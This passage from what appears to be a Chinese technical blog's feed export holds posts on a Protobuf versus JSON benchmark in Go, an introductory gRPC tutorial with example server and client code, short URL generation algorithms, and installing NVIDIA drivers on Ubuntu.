&#123;</span><br><span class="line">        out, err := proto.Marshal(g)</span><br><span class="line">        <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">            <span class="built_in">panic</span>(err)</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        g1 := &amp;Group&#123;&#125;</span><br><span class="line">        err = proto.Unmarshal(out, g1)</span><br><span class="line">        <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">            <span class="built_in">panic</span>(err)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">BenchmarkJson</span><span class="params">(b *testing.B)</span></span> &#123;</span><br><span class="line">    g := &amp;Group&#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">100</span>; i++ &#123;</span><br><span class="line">        p := &amp;Person&#123;</span><br><span class="line">            Id:    <span class="keyword">int32</span>(i),</span><br><span class="line">            Name:  <span class="string">"测试名称"</span>,</span><br><span class="line">            Age:   <span class="keyword">int32</span>(<span class="number">25</span> * i),</span><br><span class="line">            Money: <span class="number">240000.5</span>,</span><br><span class="line">            Car:   []<span class="keyword">string</span>&#123;<span class="string">"car1"</span>, <span class="string">"car2"</span>, <span class="string">"car3"</span>, <span class="string">"car4"</span>, <span class="string">"car5"</span>, <span class="string">"car7"</span>, <span class="string">"car6"</span>, <span class="string">"car21"</span>, <span class="string">"car22"</span>,&#125;,</span><br><span class="line">            Phone: &amp;Person_Phone&#123;Number: <span class="string">"0551-12323232"</span>, Type: <span class="string">"1"</span>&#125;,</span><br><span class="line">            Sex:   Person_female,</span><br><span class="line">        &#125;</span><br><span class="line">        g.Person = <span class="built_in">append</span>(g.Person, p)</span><br><span class="line">    &#125;</span><br><span class="line">    b.ResetTimer()</span><br><span class="line">        b.N = <span class="number">1000</span></span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; b.N; i++ &#123;</span><br><span class="line">        out, err := json.Marshal(g)</span><br><span class="line">        <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">            <span class="built_in">panic</span>(err)</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        g1 := &amp;Group&#123;&#125;</span><br><span class="line">        err = json.Unmarshal(out, g1)</span><br><span class="line">        <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">            <span class="built_in">panic</span>(err)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>为了方便对比，指定了测试次数为1000次，测试结果如下：</p>
<p>在1个person的级别：</p>
<p>可以看出，理论上proto明显比json要快不少，每次操作大概是4-5倍差距。后面在10，100个person的级别的测试中，基本上都是保持在4-5倍性能的差距，这个结果也和网上大部分测试结果一致。</p>
<p>关于生成的数据大小，这里也简单测试了一遍，还是上面的例子，我使用了10个person，Protobuf生成的文件大小是1030个byte,json生成的文件大小是1842个byte。</p>
<p>需要注意一点，虽然在大小上Protobuf也领先很多，但是据网上文章介绍，在经过nginx的gzip压缩之后，这2者大小基本上差不多。</p>
<h2 id="7-总结"><a href="#7-总结" class="headerlink" title="7.总结"></a>7.总结</h2><p>Protobuf作为一种新的数据交换编码方式，虽然使用起来麻烦点，但是在性能和大小上面领先很多，可以用来替换json，使用在一些对性能要求高的场景，比如移动端设备通信。除此之外，目前Protobuf主要用在gRPC用作默认数据编码格式。</p>
]]></content>
      <categories>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>Golang</tag>
      </tags>
  </entry>
  <entry>
    <title>GRPC入门和实践</title>
    <url>/2019/coding/golang/golang-grpc.html</url>
    <content><![CDATA[<h1 id="gPRC"><a href="#gPRC" class="headerlink" title="gPRC"></a>gPRC</h1><p>首先，先阐述一个误区，很多人以为gRPC只能go语言使用，以为这个g代表的就是go，其实并不是，这个g应该理解成Google，这个rpc框架是Google出品，不过Go对这个框架的支持确实非常好，看一下官网的介绍：</p>
<blockquote>
<p>gRPC is a modern open source high performance RPC framework that can run in any environment. It can efficiently connect services in and across data centers with pluggable support for load balancing, tracing, health checking and authentication. It is also applicable in last mile of distributed computing to connect devices, mobile applications and browsers to backend services.</p>
</blockquote>
<p>详细的介绍可以参考<a href="https://grpc.io" target="_blank" rel="noopener">官网</a>（grpc.io）,简单说，gRPC是一个开源的高性能rpc框架。</p>
<p>说到rpc，很多搞微服务的都喜欢用，特别是Java领域，rpc全称 Remote Procedure Call，翻译过来叫远程过程调用，这个翻译并不是特别好理解。</p>
<a id="more"></a>

<p>举个例子，假设你写了一个算法，非常牛逼，你想把这个算法给别人用，你会咋办？</p>
<p>首先，得确定这个调用方在哪里？如果这个调用方都在一个项目里面，那我们只需要写个函数，告诉别人函数名字就行了:</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> lib</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">"fmt"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Run</span><span class="params">()</span></span> &#123;</span><br><span class="line">    fmt.Println(<span class="string">"something very NB"</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>但是现实是，这个调用方不是同一个项目的，代码不在一起，是其它项目需要用，咋办呢？</p>
<p>有人说，把代码copy给别人，比较low，而且有时候代码要保密。</p>
<p>有人说，使用http服务，写个接口出来，扔一个API文档，这个方案完全可以，但是不是今天的主角。</p>
<p>或许，我们也可以使用rpc通信。</p>
<h2 id="Golang-RPC"><a href="#Golang-RPC" class="headerlink" title="Golang RPC"></a>Golang RPC</h2><p>不少语言都有自己的rpc框架，比如PHP有phprpc和yar，但是这些rpc框架局限在这个语言，无法做到跨语言之间的调用，而Go也是类似，Go标准库自带的rpc有好几种，默认采用Gob编码，只能在Go语言之间使用,还有一种jsonrpc，采用的是json编码，如果你需要跨语言的话，最好采用gRPC。</p>
<p>Go RPC的函数只有符合下面的条件才能被远程访问：</p>
<ul>
<li>函数必须是导出的(首字母大写)</li>
<li>必须有两个参数，并且是导出类型或者内建类型</li>
<li>第二个参数必须是指针类型的</li>
<li>函数还要有一个返回值 error</li>
</ul>
<p>下面看一个简单例子：</p>
<h3 id="入参出参"><a href="#入参出参" class="headerlink" title="入参出参"></a>入参出参</h3><p>我们首先单独定义了需要被远程调用的方法，以及方法的入参和出参，后面的服务端和客户端都会用到：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> golang_rpc</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">"log"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Add <span class="keyword">struct</span> &#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(a *Add)</span> <span class="title">Plus</span><span class="params">(request Request, response *Response)</span> <span class="title">error</span></span> &#123;</span><br><span class="line">    response.Result = request.A + request.B</span><br><span class="line">    log.Printf(<span class="string">"Add...%d + %d"</span>, request.A, request.B)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Request <span class="keyword">struct</span> &#123;</span><br><span class="line">    A <span class="keyword">int</span></span><br><span class="line">    B <span class="keyword">int</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Response <span class="keyword">struct</span> &#123;</span><br><span class="line">    Result <span class="keyword">int</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Server端"><a href="#Server端" class="headerlink" title="Server端"></a>Server端</h3><p>这里使用的http协议，其实还有一种tcp的用法，主要作用是注册rpc服务，开启服务。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    . <span class="string">"gRPC/golang-rpc"</span></span><br><span class="line">    <span class="string">"log"</span></span><br><span class="line">    <span class="string">"net/http"</span></span><br><span class="line">    <span class="string">"net/rpc"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    add := <span class="built_in">new</span>(Add)</span><br><span class="line">    _ = rpc.Register(add)</span><br><span class="line">    rpc.HandleHTTP()</span><br><span class="line">    log.Println(<span class="string">"rpc server started at port 8888"</span>)</span><br><span class="line">    <span class="keyword">if</span> err := http.ListenAndServe(<span class="string">":8888"</span>, <span class="literal">nil</span>); err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="built_in">panic</span>(err)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Client端"><a href="#Client端" class="headerlink" title="Client端"></a>Client端</h3><p>客户端根据定义的入参结构体拼装好请求参数，调用rpc</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    . <span class="string">"gRPC/golang-rpc"</span></span><br><span class="line">    <span class="string">"log"</span></span><br><span class="line">    <span class="string">"net/rpc"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    dial, err := rpc.DialHTTP(<span class="string">"tcp"</span>, <span class="string">":8888"</span>)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="built_in">panic</span>(err)</span><br><span class="line">    &#125;</span><br><span class="line">    args := Request&#123;</span><br><span class="line">        A: <span class="number">1</span>,</span><br><span class="line">        B: <span class="number">2</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> response = Response&#123;&#125;</span><br><span class="line">    err = dial.Call(<span class="string">"Add.Plus"</span>, args, &amp;response)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="built_in">panic</span>(err)</span><br><span class="line">    &#125;</span><br><span class="line">    log.Printf(<span class="string">"a = %d, b= %d, result = %d"</span>, args.A, args.B, response.Result)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这只是展示了Go rpc的一种用法，Go rpc的除了支持tcp之外，还可以使用json，也就是jsonrpc，其编码方式是使用json而不是默认的Gob。</p>
<h2 id="RPC-vs-HTTP"><a href="#RPC-vs-HTTP" class="headerlink" title="RPC vs HTTP"></a>RPC vs HTTP</h2><p>我所参与项目大部分都是基于http，很少使用rpc，原因之一就是因为http特别成熟，文本协议，简单易用，支持广泛，而且其它支持比如负载均衡，流量控制都非常好用。</p>
<p>本质上，这个2种通信方式都可以实现远程过程调用，也就说把数据从一个地方传输到另一个地方（经过处理再返回回来）。当然也有人说http也是rpc的一种实现形式，这些概念性的东西这里就不争论了。</p>
<p>但是rpc确实有一些优点，其中最主要的就是传输效率高，因为http是文本协议，而rpc数据协议往往是二进制。</p>
<h2 id="gRPC"><a href="#gRPC" class="headerlink" title="gRPC"></a>gRPC</h2><p>gRPC相比于其它rpc语言，目前发展迅速，不仅仅支持多语言（Go、Java、Python、JS），目前也支持Web端，意味着可以在某种程度上替代http了。</p>
<p>先不过多介绍太多理论的东西，这里先结合实际代码来看，默认情况下，gRPC使用Protobuf作为 Interface Definition Language（IDL），所谓IDL就是接口定义语言，说的通俗点就是描述这个服务的结构包括请求参数和响应结果。</p>
<p>这里说到的Protobuf又是什么东西呢？</p>
<blockquote>
<p>Protobuf(Google Protocol Buffers)是Google提供一个具有高效的协议数据交换格式工具库(类似Json)，但相比于Json，Protobuf有更高的转化效率，时间效率和空间效率都是JSON的3-5倍。</p>
</blockquote>
<p>下面，咱们先看一个demo，先写个helloWorld，gRPC的写法比起http服务确实复杂很多，我们不仅仅要写server端，还要写client端，而http服务的client端一般都有现成的工具（浏览器、curl），但gRPC的client必须是一对一定制化的，需根据IDL生成。</p>
<ol>
<li>Go的运行环境咱就不说了，目前gRPC要求Go版本在1.6以上</li>
<li>安装gRPC: go get -u google.golang.org/grpc</li>
<li>安装Protobuf v3 compiler，我的Ubuntu系统是自带这个，如果不带的话可以使用apt安装，其它系统可以参考<a href="https://github.com/protocolbuffers/Protobuf" target="_blank" rel="noopener">github</a></li>
<li>安装go的Protobuf插件： go get -u github.com/golang/Protobuf/protoc-gen-go</li>
</ol>
<p>这个IDL文件并不是Go的语法，只是Protobuf的描述语法，大概的意思相信大部分都能看懂，service 是用来定义服务，然后还定义了请求和响应的参数类型，详细的用法可以参考Protobuf的<a href="https://developers.google.com/protocol-buffers/docs/proto3#simple" target="_blank" rel="noopener">官方文档</a>。</p>
<p>项目的整理结构如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">├── client</span><br><span class="line">│   └── client.go</span><br><span class="line">├── go.mod</span><br><span class="line">├── go.sum</span><br><span class="line">├── proto</span><br><span class="line">│   ├── hello.pb.go</span><br><span class="line">│   └── hello.proto</span><br><span class="line">└── server.go</span><br></pre></td></tr></table></figure>
<p>切换到终端，在proto目录下执行<code>protoc --go_out=plugins=grpc:. *.proto</code>命令生成一个pb.go文件，这是一个go语法的文件，里面的东西非常多，我们真正用到的就是这个。</p>
<p>下面完成server端的开发：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">"context"</span></span><br><span class="line">    <span class="string">"fmt"</span></span><br><span class="line">    pb <span class="string">"gRPC/proto"</span></span><br><span class="line">    <span class="string">"google.golang.org/grpc"</span></span><br><span class="line">    <span class="string">"log"</span></span><br><span class="line">    <span class="string">"net"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> HelloService <span class="keyword">struct</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *HelloService)</span> <span class="title">Hello</span><span class="params">(ctx context.Context, r *pb.HelloRequest)</span> <span class="params">(*pb.HelloResponse, error)</span></span> &#123;</span><br><span class="line">    fmt.Println(<span class="string">"new request..."</span>)</span><br><span class="line">    <span class="keyword">return</span> &amp;pb.HelloResponse&#123;Response: r.GetRequest() + <span class="string">" Server"</span>&#125;, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> PORT = <span class="string">"8080"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    server := grpc.NewServer()</span><br><span class="line">    pb.RegisterHelloServiceServer(server, &amp;HelloService&#123;&#125;)</span><br><span class="line"></span><br><span class="line">    listen, err := net.Listen(<span class="string">"tcp"</span>, <span class="string">":"</span>+PORT)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        log.Fatalf(<span class="string">"net.Listen err: %v"</span>, err)</span><br><span class="line">    &#125;</span><br><span class="line">    _ = server.Serve(listen)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>server端的主要作用是实现服务定义的接口，然后把服务注册到rpc server里面，最后启动服务等待请求的到来，和http服务有点类似。</p>
<p>虽然服务启动了，但是这时候无法像像http一样使用浏览器或者其它工具去访问，我们必须使用特定的客户端来访问服务，下面是客户端的代码：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">"context"</span></span><br><span class="line">    pb <span class="string">"gRPC/proto"</span></span><br><span class="line">    <span class="string">"google.golang.org/grpc"</span></span><br><span class="line">    <span class="string">"log"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> PORT = <span class="string">"8080"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    conn, err := grpc.Dial(<span class="string">":"</span>+PORT, grpc.WithInsecure())</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        log.Fatalf(<span class="string">"grpc.Dial err: %v"</span>, err)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">defer</span> conn.Close()</span><br><span class="line"></span><br><span class="line">    client := pb.NewHelloServiceClient(conn)</span><br><span class="line">    resp, err := client.Hello(context.Background(), &amp;pb.HelloRequest&#123;</span><br><span class="line">        Request: <span class="string">"Hello gRPC"</span>,</span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        log.Fatalf(<span class="string">"client.Search err: %v"</span>, err)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    log.Printf(<span class="string">"resp: %s"</span>, resp.GetResponse())</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最后，先启动server，然后运行client。</p>
<p>有人可能会说，废了这么大劲，到最后结果和http服务有啥区别？我使用http服务分分钟钟搞定的事情，gRPC还需要定义这个那个…但是gRPC的功能不止这些。</p>
<h2 id="流式请求"><a href="#流式请求" class="headerlink" title="流式请求"></a>流式请求</h2><p>上面的demo只是一个simple模型，类似于http的request和response模型，但是gRPC还支持流式请求，其交互模型包括：</p>
<ol>
<li>服务端流。客户端发出一个请求，服务端返回一个响应流</li>
<li>客户端流。客户端发出一个请求流，服务端返回一个响应</li>
<li>双向流。客户端和服务端可以互相通信，类似websocket一样</li>
</ol>
<p>具体的应用场景可以结合业务需求来定，这里demo就不展示了，官方有非常详细的example，其实大部分时候还是使用simple模型比较多。</p>
<h2 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h2><p>目前gRPC已经支持移动端和Web，如果拿来替代http也可行，但是http很容易调试和测试，而gRPC则很难，而且http的通用性更广泛，如果是对外提供的公开API，非http莫属。</p>
<p>目前来说gPRC比较适合用在一些对性能要求高而且比较稳定的场景，比如项目内部微服务之间的通信，这也是大多数rpc框架的主要应用场景。</p>
]]></content>
      <categories>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>Grpc</tag>
      </tags>
  </entry>
  <entry>
    <title>短网址原理和实现</title>
    <url>/2019/coding/short-url.html</url>
    <content><![CDATA[<h2 id="1-背景介绍"><a href="#1-背景介绍" class="headerlink" title="1.背景介绍"></a>1.背景介绍</h2><p>相信很多人手机上都收到过一些营销短信，短信里面有时候会附带一些网址，如下图<br><img src="https://wangbjun.site/images/old/16ada545111ae94d.jpg" alt=""><br>这些网址往往都是非常短，但是当我们打开之后，如果你仔细观察，中间会有跳转，最终浏览器地址栏显示的网址并不是你短信里面看到的网址，这就是短网址！</p>
<a id="more"></a>

<h2 id="2-原理和应用"><a href="#2-原理和应用" class="headerlink" title="2.原理和应用"></a>2.原理和应用</h2><p>短网址一般是采用一个非常短域名下，路径参数一般只有3-6个字符组成，非常简洁！</p>
<p>使用短网址的前提是先生成短网址，主要是采用某种算法让一段短的字符对应一个长的字符，比如说从常用的0-9、a-z、A-Z共62个字符中选择6个字符，那意味着有62的6次方种组合，大概有568亿不重复的短网址可用！</p>
<p>服务器通过路径参数查询到真实的长网址，然后使用301/302跳转到真实的网址即可！</p>
<p>关于跳转，301 是永久重定向，302 是临时重定向。短地址一经生成就不会变化，所以用 301 是符合 http 语义的，浏览器会记录跳转地址，同时对服务器压力也会有一定减少。但是如果使用了 301，我们就无法统计到短地址被点击的次数了，如果对数据统计有要求的话，使用302跳转可能比较好一些！</p>
<p>短网址的主要好处是方便传输记忆，特别是在短信里面使用的时候，短信对内容字数有限制，还有比如说微博分享也使用了短网址！</p>
<h2 id="3-市面现有案例"><a href="#3-市面现有案例" class="headerlink" title="3.市面现有案例"></a>3.市面现有案例</h2><p>目前市面上有很多免费的短链接服务，功能基本上都一样，也没有什么限制！</p>
<p>(1)百度的短链接(<a href="https://dwz.cn/)，百度不仅仅提供了网页入口，也提供了接口和开发文档，简单易用！" target="_blank" rel="noopener">https://dwz.cn/)，百度不仅仅提供了网页入口，也提供了接口和开发文档，简单易用！</a></p>
<p>(2)新浪的短链接(<a href="https://sina.lt/)，目前仅提供网页入口，未发现接口服务！" target="_blank" rel="noopener">https://sina.lt/)，目前仅提供网页入口，未发现接口服务！</a></p>
<p>(3)淘宝的短链接(<a href="https://tb.am/)，目前仅提供网页入口，未发现接口服务！" target="_blank" rel="noopener">https://tb.am/)，目前仅提供网页入口，未发现接口服务！</a></p>
<p>市面还有很多其它的小的公司提供短链接服务，有些是部分免费，有些短链接是有效期的，这里不一一介绍！</p>
<h2 id="4-常用算法"><a href="#4-常用算法" class="headerlink" title="4.常用算法"></a>4.常用算法</h2><p>网上比较流行的算法有进制算法、摘要（Hash）算法、随机数算法，下面简单介绍一下：</p>
<h3 id="一-进制算法"><a href="#一-进制算法" class="headerlink" title="一.进制算法"></a>一.进制算法</h3><p>这个算法网上也有叫作自增序列算法，特点就是永不重复，设置 id 自增，一个 10进制 id 对应一个62进制的数值，1对1，也就不会出现重复的情况，这个利用的就是低进制转化为高进制时，字符数会减少的特性。</p>
<p>计算机中常见的进制有2进制，8进制，10进制，16进制，进制越大，能够表示的数越大，占用的字数也越少。下面举个例：</p>
<p>10进制的1000，在8进制里面是1750，在16进制里面就是3E8，那在62进制里面呢？有人说，计算机里面没有62进制。。。虽然没有，但是我们可以造一个，进制的转换算法是固定的，最常见的就是“除基取余法”！</p>
<p>我们假设62进制的字符序列为 0-9a-zA-Z，顺序可以打乱，但是应该固定下来，是一个从0角标开始的到61的数组，我们暂且称之为字母表！</p>
<p>====&gt; 1000/62 = 16，余8</p>
<p>====&gt; 16/62 = 0，余16</p>
<p>余数得到的数字是16、8，然后找到字母表里面角标为16和8的字符拼起来，就是g8，非常短，只有2位数！假如说我们想至少产生6位字符，那么我们可以从一个比较大的数字开始，具体可以看下图：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1位	62	0 - 61</span><br><span class="line">2位	3844	62 - 3843</span><br><span class="line">3位	约 23万	3844 - 238327</span><br><span class="line">4位	约 1400万	238328 - 14776335</span><br><span class="line">5位	约 9.1亿	14776336 - 916132831</span><br><span class="line">6位	约 568亿	916132832 - 56800235583</span><br></pre></td></tr></table></figure>

<h3 id="二-Hash算法"><a href="#二-Hash算法" class="headerlink" title="二.Hash算法"></a>二.Hash算法</h3><h4 id="第一种方式："><a href="#第一种方式：" class="headerlink" title="第一种方式："></a>第一种方式：</h4><p>简单的对长链接进行加盐md5，会生成一个32位的字符串，随机从里面取6个字符，或者简单粗暴取最后6位，但是md5只包含0-9A-Fa-f,比字母表的里面字符还少，冲突几率更大！</p>
<h4 id="第二种方式："><a href="#第二种方式：" class="headerlink" title="第二种方式："></a>第二种方式：</h4><p>1.将长网址 md5 生成 32 位签名串,分为 4 段, 每段 8 个字节</p>
<p>2.对这四段循环处理, 取 8 个字节, 将他看成 16 进制串与 0x3fffffff(30位1) 与操作, 即超过 30 位的忽略处理</p>
<p>3.这 30 位分成 6 段, 每 5 位的数字作为字母表的索引取得特定字符, 依次进行获得 6 位字符串</p>
<p>4.总的 md5 串可以获得 4 个 6 位串,取里面的任意一个就可作为这个长 url 的短 url 地址</p>
<p>生成的方式更加复杂，重复的几率低，但是依然会出现冲突！</p>
<h3 id="三-随机数算法"><a href="#三-随机数算法" class="headerlink" title="三.随机数算法"></a>三.随机数算法</h3><p>这个更简单，直接对这个62个字符数组做随机选择，选择其中6个字符当作短链接码，简单易用，但是难免会出现重复冲突！</p>
<h3 id="四-算法对比"><a href="#四-算法对比" class="headerlink" title="四.算法对比"></a>四.算法对比</h3><p>第一种算法只要解决自增id问题就可以避免冲突，自增id可以采用数据库自增主键，每次生成短码只需一次数据库操作（insert操作，获取主键id，然后算出短码即可）</p>
<p>第二种和第三种算法其实都差不多，都是依赖于程序随机，容易出现冲突，这就需要每次在插入数据库的时候判重，效率低一些！</p>
<h2 id="5-安全"><a href="#5-安全" class="headerlink" title="5.安全"></a>5.安全</h2><p>短链接虽然方便了传输和记忆，但是由于链接组成的字符个数少，更容易被爆破、猜测攻击，攻击者可以轻松遍历所有字符组成的链接！</p>
<p>所以不建议使用短链接发送具有私密性的网址，比如说重置密码链接，对一些权限、敏感信息的链接要做好二次鉴权！</p>
<p>最后，推荐一个使用golang写的短网址项目，可以作为一个单独服务部署使用: <a href="https://github.com/praglody/shorturl" target="_blank" rel="noopener">https://github.com/praglody/shorturl</a></p>
]]></content>
      <categories>
        <category>Coding</category>
      </categories>
      <tags>
        <tag>短网址</tag>
      </tags>
  </entry>
  <entry>
    <title>Ubuntu 下nvidia显卡驱动安装</title>
    <url>/2019/linux/ubuntu-nvidia-dirver.html</url>
    <content><![CDATA[<p>Linux下面的显卡驱动一直是个麻烦事，主要是独立显卡，特别是（NVIDIA）英伟达的显卡，气的当年祖师爷怒竖中指，虽然很多年过去了，情况有所改变，但也不是特别好！</p>
<h2 id="集成显卡"><a href="#集成显卡" class="headerlink" title="集成显卡"></a>集成显卡</h2><p>如果你在Linux下面不打游戏，也不搞深度学习，强烈建议你卸载独立显卡已提高性能，当然前提是你使用的intel带集显CPU，大部分intel自带集显的性能已经能满足了</p>
<p>Intel对Linux支持很好，所以Linux下面的intel集显驱动非常好，内核自带，不需要额外安装，流畅度也挺高，1080p下面60fps不是问题，但是如果你使用4k显示器，intel集显大部分都是带不动。</p>
<a id="more"></a>

<p>至于AMD的APU驱动，本人并没有试过，这里不作任何发言！</p>
<h2 id="独立显卡"><a href="#独立显卡" class="headerlink" title="独立显卡"></a>独立显卡</h2><p>如果你使用了一台4k显示器，大部分情况下你需要一个独立显卡，因为集显的话只有部分intel高端CPU和高端主板才能达到4k+60fps的情况（dp线），但是使用独显的话就很容易达到，毕竟集显免费送，独显可是要花钱买的。</p>
<p>虽然Linux自带了一个开源的 nouveau 驱动，但是性能真的堪忧，拿来带4k是不行的，必须安装独显驱动。</p>
<p>现在市场上大部分都是NVIDIA的显卡，我本人使用的也是N卡，至于A卡的情况这里也不作发言，下面说的只针对NVIDIA卡。</p>
<h2 id="手动安装"><a href="#手动安装" class="headerlink" title="手动安装"></a>手动安装</h2><p>虽然NVIDIA官网提供了最新Linux驱动的下载选项，但是本人并不建议大家尝试手动安装，因为非常麻烦，而且不同发行版不同版本之间可能存在兼容性问题。</p>
<p>不过这里还是简单说下步骤：</p>
<ol>
<li>下载安装文件，增加可执行权限，打开英伟达官网，在驱动下载页面可以下载最新的Linux驱动。</li>
<li>屏蔽nouveau驱动，编辑 /etc/modprobe.d/blacklist.conf 文件，在文件末尾加入一行 blacklist nouveau，然后使用 sudo update-initramfs -u 更新内核文件，成功后重启！</li>
<li>关闭x-server，在Ubuntu下面可以使用 service lightdm stop 命令</li>
<li>进入终端，执行安装文件，根据指示依次进行，这个脚本会做一些检测，如果检测到你没有屏蔽nouveau驱动会提示你，然后你可以选择自动创建，之后重启电脑，返回第3步</li>
<li>如果一切顺利的话，应该可以安装成功，但是往往没这么简单，比如会出现gcc版本不对的问题，还有一些第三方依赖问题，甚至卡死问题。<br>所以，我这里并不建议大家自己手动安装！！！</li>
</ol>
<h2 id="自动安装"><a href="#自动安装" class="headerlink" title="自动安装"></a>自动安装</h2><p>不同Linux发行版安装显卡驱动略有差异，有不少发行版都提供了一个比较简单的安装方式，比如Ubuntu在附加驱动里面就可以安装驱动。<br><img src="/images/old/7645cd7fcf2d40079e5aa87cb7d2c6ba.jpeg" /></p>
<p>在附加驱动里面我们可以选择需要安装的驱动，在这里列出的基本上都不会有问题，安装完成之后重启即可，默认情况下会自动启用独显！英伟达的显卡会有一个驱动设置面板，可以做一些简单设置。</p>
<h2 id="常见问题"><a href="#常见问题" class="headerlink" title="常见问题"></a>常见问题</h2><p>正常情况下，安装显卡驱动还是非常简单的，特别是在Ubuntu下面，鼠标点点就行了，然而现实往往没有这么简单，可能会遇到很多意外，下面我就说说常见的问题：</p>
<h3 id="1-卡登录"><a href="#1-卡登录" class="headerlink" title="1.卡登录"></a>1.卡登录</h3><p>安装完显卡驱动之后，登录的时候输入密码点击确认之后会返回登录页面，无法进入桌面，循环登录，也就是卡登录，通常这情况都是由于驱动不兼容或者设置不正确导致。</p>
<p>不过不要慌，卸载掉驱动就行了，虽然无法进入图形桌面，我们可以使用 <code>Alt+F1-F5</code>进入命令行，然后登录后，使用命令行下载NVIDIA驱动，<code>sudo apt purge nvidia*</code></p>
<p>卸载掉驱动后，重启就可以进入桌面了，然后可以尝试安装其它版本的驱动。</p>
<h3 id="2-卡死机"><a href="#2-卡死机" class="headerlink" title="2.卡死机"></a>2.卡死机</h3><p>表现就是在安装驱动的过程中，卡在哪里，鼠标键盘无响应，这种情况下基本上是内核卡死了，你等多久都没用。</p>
<p>一般是因为主板某些设置，比如安全启动，建议关闭安全启动，也就是secure boot</p>
<p>还有可能是因为内存原因，我之前就是因为主板上面插了4根8G内存条，但是有2根是2400MHz，有2根是2666MHz，基频不一致。</p>
<p>还有比如说CPU超频了，经过我测试，Linux对CPU超频的兼容性不好，如果超频可能会导致死机，不建议大幅度超频！</p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Ubuntu</tag>
      </tags>
  </entry>
  <entry>
    <title>Golang的常用数据结构</title>
    <url>/2019/coding/golang/golang-datastruct.html</url>
